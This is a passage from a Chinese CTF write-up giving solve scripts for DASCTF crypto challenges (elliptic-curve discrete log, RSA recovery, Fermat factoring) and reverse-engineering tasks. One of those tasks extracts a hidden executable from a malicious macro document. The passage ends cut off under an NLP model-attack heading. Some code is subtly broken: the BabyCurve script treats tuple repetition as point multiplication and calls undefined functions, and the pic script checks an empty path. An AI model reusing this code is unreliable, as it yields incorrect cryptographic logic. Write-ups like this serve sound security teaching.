logs<br><br>def recover_with_crt(logs, primes):<br>    return crt(logs, primes)<br><br>def main():<br>    p, a, G, d, b = get_params()<br>    <br>    x1, y1 = calc_x1_y1(G, b, p)<br>    <br>    d1 = 4197156738236715923181334026153482564495893747641139426<br>    check_d1(x1, y1, p, d1)<br>    <br>    d2, u, v = calc_d2_uv(x1, y1, d1, p)<br>    <br>    E = define_curve(d2, p)<br>    <br>    P = E(u, v)<br>    x2, y2 = (6784278627340957151283066249316785477882888190582875173 * b % p, <br>              6078603759966354224428976716568980670702790051879661797)<br>    u2, v2 = calc_Q(x2, y2, d2, p)<br>    <br>    Q = E(u2, v2)<br>    <br>    print(&quot;椭圆曲线阶:&quot;, E.order())<br>    <br>    primes = factor_order(E)<br>    print(&quot;素数因子:&quot;, primes)<br>    <br>    logs = calc_logs(P, Q, primes)<br>    print(&quot;离散对数:&quot;, logs)<br>    <br>    recovered = recover_with_crt(logs, primes)<br>    print(&quot;恢复的标量:&quot;, recovered)<br>    print(&quot;解密的flag:&quot;, long_to_bytes(recovered))<br><br>main()<br><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/27/kfaCBA3dugIZmzP.png" alt="image-20240827183600051"></p><h3 id="BabyCurve"><a href="#BabyCurve" class="headerlink" title="BabyCurve"></a>BabyCurve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> solve_congruence<br><span class="hljs-keyword">from</span> sympy.ntheory <span class="hljs-keyword">import</span> factorint<br><br><span class="hljs-comment"># Given data</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;iv&#x27;</span>: <span class="hljs-string">&#x27;bae1b42f174443d009c8d3a1576f07d6&#x27;</span>, <br>    <span class="hljs-string">&#x27;cipher&#x27;</span>: <span class="hljs-string">&#x27;ff34da7a65854ed75342fd4ad178bf577bd622df9850a24fd63e1da557b4b8a4&#x27;</span><br>&#125;<br>G_point = (<span class="hljs-number">584273268656071313022845392380</span>, <span class="hljs-number">105970580903682721429154563816</span>)<br>P_point = (<span class="hljs-number">401055814681171318348566474726</span>, <span class="hljs-number">293186309252428491012795616690</span>)<br>prime = <span class="hljs-number">770311352827455849356512448287</span><br><br>xG, yG = G_point<br>xP, yP = P_point<br>a_coeff = (xG**<span class="hljs-number">3</span> - xP**<span class="hljs-number">3</span> - yG**<span class="hljs-number">2</span> + yP**<span class="hljs-number">2</span>) * inverse(xP - xG, prime) % prime<br>b_coeff = (yG**<span class="hljs-number">2</span> - xG**<span class="hljs-number">3</span> - a_coeff * xG) % prime<br><br><span class="hljs-comment"># Elliptic curve operations</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">elliptic_add</span>(<span class="hljs-params">P, Q, a, prime</span>):<br>    <span class="hljs-keyword">if</span> P == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> Q<br>    <span class="hljs-keyword">if</span> Q == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> P<br>    xP, yP = P<br>    xQ, yQ = Q<br>    <br>    <span class="hljs-keyword">if</span> P != Q:<br>        m = (yQ - yP) * inverse(xQ - xP, prime) % prime<br>    <span class="hljs-keyword">else</span>:<br>        m = (<span class="hljs-number">3</span> * xP**<span class="hljs-number">2</span> + a_coeff) * inverse(<span class="hljs-number">2</span> * yP, prime) % prime<br>    <br>    xR = (m**<span class="hljs-number">2</span> - xP - xQ) % prime<br>    yR = (m * (xP - xR) - yP) % prime<br>    <span class="hljs-keyword">return</span> (xR, yR)<br><br><span class="hljs-comment"># Calculate order of G</span><br>order = <span class="hljs-number">1</span><br>current = G_point<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    current = elliptic_add(current, G_point, a_coeff, prime)<br>    order += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> current == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># Factor the order</span><br>factors = factorint(order)<br>x_values, y_values = [], []<br><br><span class="hljs-keyword">for</span> sub_order, exp <span class="hljs-keyword">in</span> factors.items():<br>    sub_order = sub_order ** exp<br>    A = (order // sub_order) * G_point<br>    B = (order // sub_order) * P_point<br>    x = discrete_log(B, A, order)<br>    x_values.append(x)<br>    y_values.append(sub_order)<br><br><span class="hljs-comment"># Chinese remainder theorem</span><br>x = solve_congruence(*[(x, y) <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x_values, y_values)])[<span class="hljs-number">0</span>] % prod(y_values)<br><br><span class="hljs-comment"># Finding the scalar multiplier</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> elliptic_add(x * G_point, (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>), a_coeff, prime) == P_point:<br>        <span class="hljs-keyword">break</span><br>    x += prod(y_values)<br><br><span class="hljs-comment"># Decrypting the flag</span><br>iv = <span class="hljs-built_in">bytes</span>.fromhex(data[<span class="hljs-string">&quot;iv&quot;</span>])<br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(data[<span class="hljs-string">&quot;cipher&quot;</span>])<br>key = sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()[:<span class="hljs-number">16</span>]<br>aes_cipher = AES.new(key, AES.MODE_CBC, iv)<br>flag = aes_cipher.decrypt(ciphertext)<br><br><span class="hljs-built_in">print</span>(flag.decode().strip())<br><span class="hljs-comment"># DASCTF&#123;THe_C0rv!_1s_Aw3s0me@!!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="RSA-loss"><a href="#RSA-loss" class="headerlink" title="RSA_loss"></a>RSA_loss</h3><p>已经给我们了基本的rsa加密解密了 那么其他的解密方法就不用去考虑了 但是得到的m是不对的  那么根据同余的性质 符合解密公式的m有很多个 既然这个给我们的m不对  那我们就继续去调整m 知道得到正确的正则匹配的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> re<br><br>p = <span class="hljs-number">898278915648707936019913202333</span><br>q = <span class="hljs-number">814090608763917394723955024893</span><br>c = <span class="hljs-number">356435791209686635044593929546092486613929446770721636839137</span><br>n = p * q<br>e = <span class="hljs-number">65537</span><br><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = invert(e, phi_n)<br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>m = <span class="hljs-built_in">int</span>(m)<br><br><span class="hljs-comment"># 调整 m 直到其最后一个字节为 125 (对应字符 &#x27;&#125;&#x27;)</span><br><span class="hljs-keyword">while</span> m % <span class="hljs-number">256</span> != <span class="hljs-number">125</span>:<br>    m += n<br><br>t = <span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span> + <span class="hljs-string">b&#x27;0&#x27;</span> * (math.floor(math.log(m, <span class="hljs-number">256</span>)) - <span class="hljs-number">7</span>)<br><br>decrypted_message = long_to_bytes(m)<br>step_size = n * <span class="hljs-number">256</span><br><span class="hljs-comment"># 循环调整 m 直到符合指定的正则表达式模式</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> re.fullmatch(<span class="hljs-string">b&#x27;[0-9a-zA-Z_&#123;&#125;]+&#x27;</span>, decrypted_message):<br>    <span class="hljs-keyword">if</span> decrypted_message.startswith(<span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span>):<br>        m += step_size<br>    <span class="hljs-keyword">else</span>:<br><br>        diff = bytes_to_long(t) - m<br>        m += step_size * (diff // step_size + (<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> diff % step_size != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>))<br>        t += <span class="hljs-string">b&#x27;0&#x27;</span><br><br>    m = <span class="hljs-built_in">int</span>(m)<br>    decrypted_message = long_to_bytes(m)<br><br><span class="hljs-built_in">print</span>(decrypted_message)<br><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/27/HkZL1gKRwYuszGb.png" alt="image-20240827184028448"></p><h3 id="TheoremPlus"><a href="#TheoremPlus" class="headerlink" title="TheoremPlus"></a>TheoremPlus</h3><p>题目有提示这个Theorem ，去搜到 Wilson’s Theorem  这个公式就是当n为素数的时候 （n-1）!%n&#x3D;(n-1)</p><p>然后又去试了试后面不是素数的时候发现这个加密就是求的素数的个数啊  但是多了2，然后得到了e  什么都有了  就直接rsa基本解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> primepi<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> isqrt, invert<br><br>n = <span class="hljs-number">18770575776346636857117989716700159556553308603827318013591587255198383129370907809760732011993542700529211200756354110539398800399971400004000898098091275284235225898698802555566416862975758535452624647017057286675078425814784682675012671384340267087604803050995107534481069279281213277371234272710195280647747033302773076094600917583038429969629948198841325080329081838681126456119415461246986745162687569680825296434756908111148165787768172000131704615314046005916223370429567142992192702888820837032850104701948658736010527261246199512595520995042205818856177310544178940343722756848658912946025299687434514029951</span><br>c = <span class="hljs-number">2587907790257921446754254335909686808394701314827194535473852919883847207482301560195700622542784316421967768148156146355099210400053281966782598551680260513547233270646414440776109941248869185612357797869860293880114609649325409637239631730174236109860697072051436591823617268725493768867776466173052640366393488873505207198770497373345116165334779381031712832136682178364090547875479645094274237460342318587832274304777193468833278816459344132231018703578274192000016560653148923056635076144189403004763127515475672112627790796376564776321840115465990308933303392198690356639928538984862967102082126458529748355566</span><br>e = primepi(<span class="hljs-number">703440151</span>) - <span class="hljs-number">2</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fermat</span>(<span class="hljs-params">n</span>):<br>    a = isqrt(n)<br>    b2 = a * a - n<br>    b = isqrt(n)<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> b * b != b2:<br>        a = a + <span class="hljs-number">1</span><br>        b2 = a * a - n<br>        b = isqrt(b2)<br>        count += <span class="hljs-number">1</span><br>    p = a + b<br>    q = a - b<br>    <span class="hljs-keyword">assert</span> n == p * q<br>    <span class="hljs-keyword">return</span> p, q<br><br><span class="hljs-comment"># 使用 Fermat 分解</span><br>p, q = fermat(n)<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>ee = <span class="hljs-built_in">int</span>(e)<br>d = <span class="hljs-built_in">int</span>(invert(ee, phi))<br><br><span class="hljs-comment"># 执行解密</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># 将 m 转换为 Python 的 int 类型</span><br>m = <span class="hljs-built_in">int</span>(m)<br><br><span class="hljs-comment"># 将 m 转换为字节并打印解密的消息</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pic"><a href="#pic" class="headerlink" title="pic"></a>pic</h3><p>输入key后发现flag的图片发生了改变</p><p>于是遍历所有的key来爆破 所有的图片</p><p>最后能得到flag</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> shutil<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_png_signature</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># 验证数据是否具有PNG文件的标志性字节（签名）。</span><br>    <span class="hljs-keyword">return</span> data[:<span class="hljs-number">8</span>] == <span class="hljs-string">b&#x27;\x89PNG\r\n\x1a\n&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_png_in_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-comment"># 打开文件并检查其内容是否包含有效的PNG签名。</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        content = file.read()<br>    <span class="hljs-keyword">return</span> validate_png_signature(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command_and_validate</span>(<span class="hljs-params">input_value</span>):<br>    <span class="hljs-comment"># 执行外部命令，并将输入传递给它。检查输出文件是否为有效的PNG。</span><br>    proc = subprocess.Popen(<br>        [<span class="hljs-string">&#x27;re.exe&#x27;</span>],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=<span class="hljs-literal">True</span><br>    )<br><br>    <span class="hljs-comment"># 获取命令的输出和错误信息</span><br>    output, errors = proc.communicate(<span class="hljs-built_in">input</span>=input_value)<br><br>    <span class="hljs-keyword">if</span> errors:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;errors&quot;</span>)<br><br>    <span class="hljs-comment"># 验证生成的flag.png文件是否为有效的PNG</span><br>    <span class="hljs-keyword">if</span> verify_png_in_file(<span class="hljs-string">&#x27;&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(input_value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BF</span>():<br>    <span class="hljs-comment"># 生成所有可能的5字符组合（数字和小写字母），并尝试破解。</span><br>    charset = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span><br><br>    <span class="hljs-keyword">for</span> combination <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">5</span>):<br>        candidate_key = <span class="hljs-string">&#x27;&#x27;</span>.join(combination)<br>        execute_command_and_validate(candidate_key)<br>        swap_files(<span class="hljs-string">&#x27;my.png&#x27;</span>, <span class="hljs-string">&#x27;my1.png&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">swap_files</span>(<span class="hljs-params">source_file, destination_file</span>):<br>    <span class="hljs-comment"># 用源文件替换目标文件。如果目标文件存在，则先删除它。</span><br>    <span class="hljs-keyword">if</span> os.path.exists(destination_file):<br>        os.remove(destination_file)<br>    shutil.copy(source_file, destination_file)<br><br>BF()<br><br></code></pre></td></tr></table></figure><h3 id="docCrack"><a href="#docCrack" class="headerlink" title="docCrack"></a>docCrack</h3><p>打开发现宏被禁用了，启用看看</p><p><img src="https://s2.loli.net/2024/08/28/67pqwEKrgISOGFb.png" alt="image-20240828005420389"></p><p>看看宏的源文件，发现有密码</p><p><img src="https://s2.loli.net/2024/08/28/VCtYE1QmfAjGNen.png" alt="image-20240828021158749"></p><p>用passware kit爆破得到密码</p><p><img src="https://s2.loli.net/2024/08/28/tOnsbXu9koLxGVg.png" alt="image-20240828015044581"></p><p>查看vb源文件，发现有操作del了文件，把它删掉，得到temp1文件</p><p><img src="https://s2.loli.net/2024/08/28/hbfywRYsrV5vGPN.png" alt="image-20240828021651014"></p><p><img src="https://s2.loli.net/2024/08/28/KXEeNLpm8caHbG3.png" alt="image-20240828021737480"></p><p>不知道是什么加密方法，把docm拖到沙箱里</p><p><img src="https://s2.loli.net/2024/08/28/3z92KFXOma1qUwf.png" alt="image-20240828021952371"></p><p>两次base64得到mz开头的文件，下载下来</p><p><img src="https://s2.loli.net/2024/08/28/gQp9jcWtBxy6SMu.png" alt="image-20240828022040111"></p><p>拖到ida里</p><p><img src="https://s2.loli.net/2024/08/28/pQfBVZb7y5vues6.png" alt="image-20240828022155327"></p><p>就是简单的位移</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">v7 = [<span class="hljs-number">4288</span>, <span class="hljs-number">4480</span>, <span class="hljs-number">5376</span>, <span class="hljs-number">4352</span>, <span class="hljs-number">5312</span>, <span class="hljs-number">4160</span>, <span class="hljs-number">7936</span>, <span class="hljs-number">5184</span>, <span class="hljs-number">6464</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">3456</span>,<span class="hljs-number">7424</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">6336</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">6720</span>, <span class="hljs-number">6144</span>, <span class="hljs-number">6272</span>, <span class="hljs-number">7488</span>, <span class="hljs-number">6656</span>, <span class="hljs-number">7296</span>, <span class="hljs-number">7424</span>, <span class="hljs-number">2432</span>,<span class="hljs-number">2432</span>, <span class="hljs-number">2432</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">4416</span>, <span class="hljs-number">3456</span>, <span class="hljs-number">7168</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">7488</span>, <span class="hljs-number">6272</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">3520</span>, <span class="hljs-number">6208</span>,<span class="hljs-number">5632</span>, <span class="hljs-number">4736</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">6400</span>, <span class="hljs-number">7488</span>, <span class="hljs-number">3520</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">5184</span>, <span class="hljs-number">3456</span>, <span class="hljs-number">7488</span>, <span class="hljs-number">7296</span>, <span class="hljs-number">3200</span>,<span class="hljs-number">6272</span>, <span class="hljs-number">7424</span>, <span class="hljs-number">2432</span>, <span class="hljs-number">2432</span>, <span class="hljs-number">2432</span>, <span class="hljs-number">7808</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v7)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(v7[i] &gt;&gt; <span class="hljs-number">6</span>) , end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/28/4oBiKwMHftEPjGn.png" alt="image-20240828022912708"></p><p>cyberchef里magic就能得到flag</p><p><img src="https://s2.loli.net/2024/08/28/SP6dKo5HspC9lqv.png" alt="image-20240828023022441"></p><h3 id="你这主函数保真么"><a href="#你这主函数保真么" class="headerlink" title="你这主函数保真么"></a>你这主函数保真么</h3><p>首先找到真正的主函数</p><p><img src="https://s2.loli.net/2024/08/28/pYokft4MO9PRJEi.png" alt="image-20240828005008357"></p><p>一个简单的离散余弦的逆变化和一个四舍五入，别忘了test2最后是一个rot13</p><p><img src="https://s2.loli.net/2024/08/28/ph4VXNgw9WocubP.png" alt="image-20240828005109916"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> scipy.fftpack <span class="hljs-keyword">import</span> dct, idct<br>A=[<span class="hljs-number">513.355</span>, -<span class="hljs-number">37.7986</span>, <span class="hljs-number">8.7316</span>, -<span class="hljs-number">10.7832</span>, -<span class="hljs-number">1.3097</span>, -<span class="hljs-number">20.5779</span>,<span class="hljs-number">6.98641</span>, -<span class="hljs-number">29.2989</span>, <span class="hljs-number">15.9422</span>, <span class="hljs-number">21.4138</span>, <span class="hljs-number">29.4754</span>, -<span class="hljs-number">2.77161</span>,-<span class="hljs-number">6.58794</span>, -<span class="hljs-number">4.22332</span>, -<span class="hljs-number">7.20771</span>, <span class="hljs-number">8.83506</span>, -<span class="hljs-number">4.38138</span>, -<span class="hljs-number">19.3898</span>,<br>   <span class="hljs-number">18.3453</span>, <span class="hljs-number">6.88259</span>, -<span class="hljs-number">14.7652</span>, <span class="hljs-number">14.6102</span>, <span class="hljs-number">24.7414</span>, -<span class="hljs-number">11.6222</span>,-<span class="hljs-number">9.754759999999999</span>, <span class="hljs-number">12.2424</span>, <span class="hljs-number">13.4343</span>, -<span class="hljs-number">34.9307</span>, -<span class="hljs-number">35.735</span>,-<span class="hljs-number">20.0848</span>, <span class="hljs-number">39.689</span>, <span class="hljs-number">21.879</span>, <span class="hljs-number">26.8296</span>]<br><span class="hljs-comment">#离散余弦变化逆变换 </span><br>C = idct(A, norm=<span class="hljs-string">&#x27;ortho&#x27;</span>)<br><span class="hljs-built_in">print</span>(C)<br><span class="hljs-comment">#chr输出 四舍五入</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(C)):<br>    C[i] = <span class="hljs-built_in">round</span>(C[i])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> C])) <br><br><br>然后再rot13解密<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/08/27/1pXI5eNOK8DduF6.png" alt="image-20240827191957560"></p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="NLP-Model-Attack"><a href="#NLP-Model-Attack" class="headerlink" title="NLP_Model_Attack"></a>NLP_Model_Attack</h3><p>AI 攻击， 暴力美学</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span 